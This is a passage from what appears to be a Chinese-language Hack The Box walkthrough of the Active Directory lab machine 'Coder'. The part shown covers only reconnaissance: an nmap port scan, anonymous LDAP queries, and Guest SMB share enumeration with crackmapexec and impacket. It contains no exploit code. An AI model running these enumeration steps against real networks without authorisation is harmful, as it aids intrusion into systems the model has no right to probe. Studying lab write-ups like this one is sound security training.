class="widget-tag-list-link" href="/tags/powerview/" rel="tag">powerview</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pre2k/" rel="tag">pre2k</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/psexec/" rel="tag">psexec</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pswa/" rel="tag">pswa</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pth/" rel="tag">pth</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pyjail/" rel="tag">pyjail</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rbcd/" rel="tag">rbcd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/reg/" rel="tag">reg</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/remote-potato/" rel="tag">remote-potato</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/reverse/" rel="tag">reverse</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rootkit/" rel="tag">rootkit</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rosating/" rel="tag">rosating</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rpc/" rel="tag">rpc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rpcclient/" rel="tag">rpcclient</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/runascs/" rel="tag">runascs</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/s3/" rel="tag">s3</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sercerts/" rel="tag">sercerts</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/service/" rel="tag">service</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sherlocks/" rel="tag">sherlocks</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/shm/" rel="tag">shm</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sliver-ticketer/" rel="tag">sliver ticketer</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/smb/" rel="tag">smb</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/smb-krbrelayx/" rel="tag">smb_krbrelayx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/smbmap/" rel="tag">smbmap</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/splunk/" rel="tag">splunk</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/spn/" rel="tag">spn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sqlcmd/" rel="tag">sqlcmd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sqli/" rel="tag">sqli</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sssd/" rel="tag">sssd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ssti/" rel="tag">ssti</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/study/" rel="tag">study</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/svn/" rel="tag">svn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/symlink/" rel="tag">symlink</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sysctl/" rel="tag">sysctl</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/teampass/" rel="tag">teampass</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/tgt/" rel="tag">tgt</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/username-anarchy/" rel="tag">username-anarchy</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/wapt/" rel="tag">wapt</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/websocket/" rel="tag">websocket</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/winlogon/" rel="tag">winlogon</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ysoserial-net/" rel="tag">ysoserial.net</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/zip/" rel="tag">zip</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E5%AE%9E%E4%BE%8B%E8%AE%B0%E5%BD%95/" rel="tag">实例记录</a></li></ul>
    </div>
  </div>


  
  <div class="sticky">
    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Recent Posts</h3>
      <ul>
        
          <a class="recent-link" href="/2025/07/14/htb-wp-Outbound/" title="【season-8】 htb Outbound wp" >
            <div class="recent-link-text">
              【season-8】 htb Outbound wp
            </div>
          </a>
        
          <a class="recent-link" href="/2025/07/11/Tracks-AD-Coder/" title="Tracks-AD-Coder" >
            <div class="recent-link-text">
              Tracks-AD-Coder
            </div>
          </a>
        
          <a class="recent-link" href="/2025/07/06/htb-wp-Voleur/" title="【season-8】 htb Voleur wp" >
            <div class="recent-link-text">
              【season-8】 htb Voleur wp
            </div>
          </a>
        
          <a class="recent-link" href="/2025/06/09/box-wp-TombWatcher/" title="【season-8】 htb TombWatcher wp" >
            <div class="recent-link-text">
              【season-8】 htb TombWatcher wp
            </div>
          </a>
        
          <a class="recent-link" href="/2025/06/06/Tracks-cloud-Vessel/" title="Tracks-cloud-Vessel" >
            <div class="recent-link-text">
              Tracks-cloud-Vessel
            </div>
          </a>
        
      </ul>
    </div>
  </div>

    
  </div> 
</sidebar>


    </div>
    
    <div id="toc" class="widget-wrap">
      <button class="toc-toggle" onclick="toggleTOC()">
    <span class="toc-toggle-icon">
        <i class="fa fa-angle-down" aria-hidden="true" style="border-radius: 50%; padding: 5px; border: 1px solid var(--link);"></i>
    </span>
</button>
<div id="tocContainer" style="display: block;">
    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Nmap"><span class="toc-number">1.</span> <span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Ldap"><span class="toc-number">2.</span> <span class="toc-text">Ldap</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#User"><span class="toc-number">3.</span> <span class="toc-text">User</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#to-s-blade"><span class="toc-number">3.1.</span> <span class="toc-text">to s.blade</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#to-svc-teamcity"><span class="toc-number">4.</span> <span class="toc-text">to svc_teamcity</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bloodhound"><span class="toc-number">4.0.1.</span> <span class="toc-text">bloodhound</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web"><span class="toc-number">4.0.2.</span> <span class="toc-text">web</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#to-Root"><span class="toc-number">5.</span> <span class="toc-text">to Root</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#to-e-black"><span class="toc-number">5.1.</span> <span class="toc-text">to e.black</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#to-DC"><span class="toc-number">5.2.</span> <span class="toc-text">to DC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#cve-2022-29623"><span class="toc-number">5.2.1.</span> <span class="toc-text">cve-2022-29623</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shadow"><span class="toc-number">5.3.</span> <span class="toc-text">shadow</span></a></li></ol></li></ol>
</div>
<script>
    function toggleTOC() {
        const tocContainer = document.getElementById('tocContainer');
        tocContainer.style.display = tocContainer.style.display === 'none' ? 'block' : 'none';
        const toggleIcon = document.querySelector('.toc-toggle-icon i');
        toggleIcon.classList.toggle('fa-angle-down');
        toggleIcon.classList.toggle('fa-angle-up');
    }
</script>
<style>
    .toc-toggle {
        position: relative;
        display: inline-block;
        padding: 2% 2% 2%;
        border: none;
        border-radius: 100%;
        background-color: var(--link);
        cursor: pointer;
        transition: all 0.1s ease;
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        /* position: absolute; */
        top: 0;
        right: 0;
        z-index: 10;
    }

    .toc-toggle:hover {
        background-color: var(--selection-bg);
        transform: scale(1.1);
    }

    .toc-toggle-icon {
        display: inline-block;
        vertical-align: middle;
    }

    .toc-toggle-icon i {
        display: inline-block;
        border-radius: 50%; /* Ensures the icon itself is a perfect circle */
    }

    /* #tocContainer {
        display: block;
        margin-top: 10px;
    } */
    #tocContainer {
    position: relative;
    padding-top: 10px; /* 留出按钮位置 */
}
</style>


    </div>
    
    <div id="content-body">
       


<article id="post-Tracks-AD-Coder" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
    
<div class="article-gallery">
  <div class="article-gallery-photos">
    
      <a class="article-gallery-img" rel="gallery_cmczvq8c10000awky5ge9dyqf">
        <img src="https://image.baidu.com/search/down?url=http://tvax4.sinaimg.cn/mw690/0065CzJOly1i3bhthg68xj31k01601fo.jpg" itemprop="image">
      </a>
    
  </div>
</div>

   
  <div class="article-inner">
    <div class="article-main">
      <header class="article-header">
        
<div class="main-title-bar">
  <div class="main-title-dot"></div>
  
    
      <h1 class="p-name article-title" itemprop="headline name">
        Tracks-AD-Coder
      </h1>
    
  
</div>

        <div class='meta-info-bar'>
          <div class="meta-info">
  <time class="dt-published" datetime="2025-07-11T02:49:03.000Z" itemprop="datePublished">2025-07-11</time>
</div>
          <div class="need-seperator meta-info">
            <div class="meta-cate-flex">
  
  <a class="meta-cate-link" href="/categories/AD/">AD</a>
   
</div>
  
          </div>
          <div class="wordcount need-seperator meta-info">
            38k words 
          </div>
        </div>
        
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/AD/" rel="tag">AD</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ADCS/" rel="tag">ADCS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/" rel="tag">C#</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CI-CD/" rel="tag">CI&#x2F;CD</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CVE-2022-29623/" rel="tag">CVE-2022-29623</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CreateChild/" rel="tag">CreateChild</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/DACL/" rel="tag">DACL</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PKI-ADMIN/" rel="tag">PKI ADMIN</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/TOTP/" rel="tag">TOTP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/TeamCity/" rel="tag">TeamCity</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

      </header>
      <div class="e-content article-entry" itemprop="articleBody">
        
          <h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">└─$ sudo nmap -sS 10.10.11.207 -p- --min-rate=3000</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 18:47 EDT</span><br><span class="line">Warning: 10.10.11.207 giving up on port because retransmission <span class="built_in">cap</span> hit (10).</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.207</span><br><span class="line">Host is up (0.32s latency).</span><br><span class="line">Not shown: 65200 closed tcp ports (reset), 307 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">53/tcp    open  domain</span><br><span class="line">80/tcp    open  http</span><br><span class="line">88/tcp    open  kerberos-sec</span><br><span class="line">135/tcp   open  msrpc</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">389/tcp   open  ldap</span><br><span class="line">443/tcp   open  https</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">464/tcp   open  kpasswd5</span><br><span class="line">593/tcp   open  http-rpc-epmap</span><br><span class="line">636/tcp   open  ldapssl</span><br><span class="line">3268/tcp  open  globalcatLDAP</span><br><span class="line">3269/tcp  open  globalcatLDAPssl</span><br><span class="line">5985/tcp  open  wsman</span><br><span class="line">9389/tcp  open  adws</span><br><span class="line">47001/tcp open  winrm</span><br><span class="line">49664/tcp open  unknown</span><br><span class="line">49665/tcp open  unknown</span><br><span class="line">49666/tcp open  unknown</span><br><span class="line">49667/tcp open  unknown</span><br><span class="line">49677/tcp open  unknown</span><br><span class="line">49690/tcp open  unknown</span><br><span class="line">49691/tcp open  unknown</span><br><span class="line">49693/tcp open  unknown</span><br><span class="line">49696/tcp open  unknown</span><br><span class="line">49704/tcp open  unknown</span><br><span class="line">50691/tcp open  unknown</span><br><span class="line">50705/tcp open  unknown</span><br></pre></td></tr></table></figure>

<h1 id="Ldap"><a href="#Ldap" class="headerlink" title="Ldap"></a>Ldap</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">└─$ ldapsearch -x -H &#x27;ldap://10.10.11.207&#x27; -s base</span><br><span class="line"># extended LDIF</span><br><span class="line">#</span><br><span class="line"># LDAPv3</span><br><span class="line"># base &lt;&gt; (default) with scope baseObject</span><br><span class="line"># filter: (objectclass=*)</span><br><span class="line"># requesting: ALL</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line">dn:</span><br><span class="line">domainFunctionality: 7</span><br><span class="line">forestFunctionality: 7</span><br><span class="line">domainControllerFunctionality: 7</span><br><span class="line">rootDomainNamingContext: DC=coder,DC=htb</span><br><span class="line">ldapServiceName: coder.htb:dc01$@CODER.HTB</span><br><span class="line">isGlobalCatalogReady: TRUE</span><br><span class="line">supportedSASLMechanisms: GSSAPI</span><br><span class="line">supportedSASLMechanisms: GSS-SPNEGO</span><br><span class="line">supportedSASLMechanisms: EXTERNAL</span><br><span class="line">supportedSASLMechanisms: DIGEST-MD5</span><br><span class="line">supportedLDAPVersion: 3</span><br><span class="line">supportedLDAPVersion: 2</span><br><span class="line">supportedLDAPPolicies: MaxPoolThreads</span><br><span class="line">supportedLDAPPolicies: MaxPercentDirSyncRequests</span><br><span class="line">supportedLDAPPolicies: MaxDatagramRecv</span><br><span class="line">supportedLDAPPolicies: MaxReceiveBuffer</span><br><span class="line">supportedLDAPPolicies: InitRecvTimeout</span><br><span class="line">supportedLDAPPolicies: MaxConnections</span><br><span class="line">supportedLDAPPolicies: MaxConnIdleTime</span><br><span class="line">supportedLDAPPolicies: MaxPageSize</span><br><span class="line">supportedLDAPPolicies: MaxBatchReturnMessages</span><br><span class="line">supportedLDAPPolicies: MaxQueryDuration</span><br><span class="line">supportedLDAPPolicies: MaxDirSyncDuration</span><br><span class="line">supportedLDAPPolicies: MaxTempTableSize</span><br><span class="line">supportedLDAPPolicies: MaxResultSetSize</span><br><span class="line">supportedLDAPPolicies: MinResultSets</span><br><span class="line">supportedLDAPPolicies: MaxResultSetsPerConn</span><br><span class="line">supportedLDAPPolicies: MaxNotificationPerConn</span><br><span class="line">supportedLDAPPolicies: MaxValRange</span><br><span class="line">supportedLDAPPolicies: MaxValRangeTransitive</span><br><span class="line">supportedLDAPPolicies: ThreadMemoryLimit</span><br><span class="line">supportedLDAPPolicies: SystemMemoryLimitPercent</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.319</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.801</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.473</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.528</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.417</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.619</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.841</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.529</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.805</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.521</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.970</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1338</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.474</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1339</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1340</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1413</span><br><span class="line">supportedControl: 2.16.840.1.113730.3.4.9</span><br><span class="line">supportedControl: 2.16.840.1.113730.3.4.10</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1504</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1852</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.802</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1907</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1948</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1974</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1341</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2026</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2064</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2065</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2066</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2090</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2205</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2204</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2206</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2211</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2239</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2255</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2256</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2309</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2330</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2354</span><br><span class="line">supportedCapabilities: 1.2.840.113556.1.4.800</span><br><span class="line">supportedCapabilities: 1.2.840.113556.1.4.1670</span><br><span class="line">supportedCapabilities: 1.2.840.113556.1.4.1791</span><br><span class="line">supportedCapabilities: 1.2.840.113556.1.4.1935</span><br><span class="line">supportedCapabilities: 1.2.840.113556.1.4.2080</span><br><span class="line">supportedCapabilities: 1.2.840.113556.1.4.2237</span><br><span class="line">subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=coder,DC=htb</span><br><span class="line">serverName: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configur</span><br><span class="line"> ation,DC=coder,DC=htb</span><br><span class="line">schemaNamingContext: CN=Schema,CN=Configuration,DC=coder,DC=htb</span><br><span class="line">namingContexts: DC=coder,DC=htb</span><br><span class="line">namingContexts: CN=Configuration,DC=coder,DC=htb</span><br><span class="line">namingContexts: CN=Schema,CN=Configuration,DC=coder,DC=htb</span><br><span class="line">namingContexts: DC=DomainDnsZones,DC=coder,DC=htb</span><br><span class="line">namingContexts: DC=ForestDnsZones,DC=coder,DC=htb</span><br><span class="line">isSynchronized: TRUE</span><br><span class="line">highestCommittedUSN: 200765</span><br><span class="line">dsServiceName: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,</span><br><span class="line"> CN=Sites,CN=Configuration,DC=coder,DC=htb</span><br><span class="line">dnsHostName: dc01.coder.htb</span><br><span class="line">defaultNamingContext: DC=coder,DC=htb</span><br><span class="line">currentTime: 20250612064122.0Z</span><br><span class="line">configurationNamingContext: CN=Configuration,DC=coder,DC=htb</span><br><span class="line"></span><br><span class="line"># search result</span><br><span class="line">search: 2</span><br><span class="line">result: 0 Success</span><br><span class="line"></span><br><span class="line"># numResponses: 2</span><br><span class="line"># numEntries: 1</span><br></pre></td></tr></table></figure>

<h1 id="User"><a href="#User" class="headerlink" title="User"></a>User</h1><h2 id="to-s-blade"><a href="#to-s-blade" class="headerlink" title="to s.blade"></a>to s.blade</h2><p>枚举发现guest开了，能访问smb</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">└─$ crackmapexec smb 10.10.11.207 -u Guest -p <span class="string">&#x27;&#x27;</span>  --shares                            </span><br><span class="line">SMB         10.10.11.207    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:coder.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.207    445    DC01             [+] coder.htb\Guest: </span><br><span class="line">SMB         10.10.11.207    445    DC01             [+] Enumerated shares</span><br><span class="line">SMB         10.10.11.207    445    DC01             Share           Permissions     Remark</span><br><span class="line">SMB         10.10.11.207    445    DC01             -----           -----------     ------</span><br><span class="line">SMB         10.10.11.207    445    DC01             ADMIN$                          Remote Admin</span><br><span class="line">SMB         10.10.11.207    445    DC01             C$                              Default share</span><br><span class="line">SMB         10.10.11.207    445    DC01             Development     READ            </span><br><span class="line">SMB         10.10.11.207    445    DC01             IPC$            READ            Remote IPC</span><br><span class="line">SMB         10.10.11.207    445    DC01             NETLOGON                        Logon server share </span><br><span class="line">SMB         10.10.11.207    445    DC01             SYSVOL                          Logon server share </span><br><span class="line">SMB         10.10.11.207    445    DC01             Users           READ</span><br></pre></td></tr></table></figure>


<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">└─$ impacket-smbclient <span class="string">&#x27;coder.htb/Guest&#x27;</span>@10.10.11.207</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">Type <span class="built_in">help</span> <span class="keyword">for</span> list of commands</span><br><span class="line"><span class="comment"># shares</span></span><br><span class="line">ADMIN$</span><br><span class="line">C$</span><br><span class="line">Development</span><br><span class="line">IPC$</span><br><span class="line">NETLOGON</span><br><span class="line">SYSVOL</span><br><span class="line">Users</span><br><span class="line"><span class="comment"># </span></span><br></pre></td></tr></table></figure>

<p>枚举share的文件内容，其中在Users下的 <code>/public/Libraries</code> 里有个 <code>.library-ms</code> </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"># pwd</span><br><span class="line">/public/Libraries</span><br><span class="line"></span><br><span class="line"># ls</span><br><span class="line">drw-rw-rw-          0  Tue Dec 13 19:05:28 2022 .</span><br><span class="line">drw-rw-rw-          0  Tue Dec 13 19:05:28 2022 ..</span><br><span class="line">-rw-rw-rw-        175  Tue Dec 13 19:05:28 2022 desktop.ini</span><br><span class="line">-rw-rw-rw-        999  Tue Dec 13 19:05:28 2022 RecordedTV.library-ms</span><br><span class="line"># cat RecordedTV.library-ms</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;libraryDescription xmlns=&quot;http://schemas.microsoft.com/windows/2009/library&quot;&gt;</span><br><span class="line">  &lt;!-- IDS_RECORDEDTVLIBRARY --&gt;</span><br><span class="line">  &lt;name&gt;@shell32.dll,-34615&lt;/name&gt;</span><br><span class="line">  &lt;!-- SHIDI_LIBRARYRECORDEDTV --&gt;</span><br><span class="line">  &lt;iconReference&gt;imageres.dll,-1008&lt;/iconReference&gt;</span><br><span class="line">  &lt;isLibraryPinned&gt;true&lt;/isLibraryPinned&gt;</span><br><span class="line">  &lt;templateInfo&gt;</span><br><span class="line">    &lt;!-- FOLDERTYPEID_Videos --&gt;</span><br><span class="line">    &lt;folderType&gt;&#123;5fa96407-7e77-483c-ac93-691d05850de8&#125;&lt;/folderType&gt;</span><br><span class="line">  &lt;/templateInfo&gt;</span><br><span class="line">  &lt;searchConnectorDescriptionList&gt;</span><br><span class="line">    &lt;searchConnectorDescription publisher=&quot;Microsoft&quot; product=&quot;Windows&quot;&gt;</span><br><span class="line">      &lt;!-- IDS_RECORDEDTVLOCATIONDESCRIPTION --&gt;</span><br><span class="line">      &lt;description&gt;@shell32.dll,-34617&lt;/description&gt;</span><br><span class="line">      &lt;isDefaultSaveLocation&gt;true&lt;/isDefaultSaveLocation&gt;</span><br><span class="line">      &lt;isDefaultNonOwnerSaveLocation&gt;true&lt;/isDefaultNonOwnerSaveLocation&gt;</span><br><span class="line">      &lt;simpleLocation&gt;</span><br><span class="line">        &lt;url&gt;shell:public\Recorded TV&lt;/url&gt;</span><br><span class="line">      &lt;/simpleLocation&gt;</span><br><span class="line">    &lt;/searchConnectorDescription&gt;</span><br><span class="line">  &lt;/searchConnectorDescriptionList&gt;</span><br><span class="line">&lt;/libraryDescription&gt;</span><br></pre></td></tr></table></figure>

<p>如果是可以put的话有概率是替换文件钓鱼，但是这里没有上传权限，所以用不到。</p>
<p>然后是 <code>Development</code> ，这里有两个目录</p>
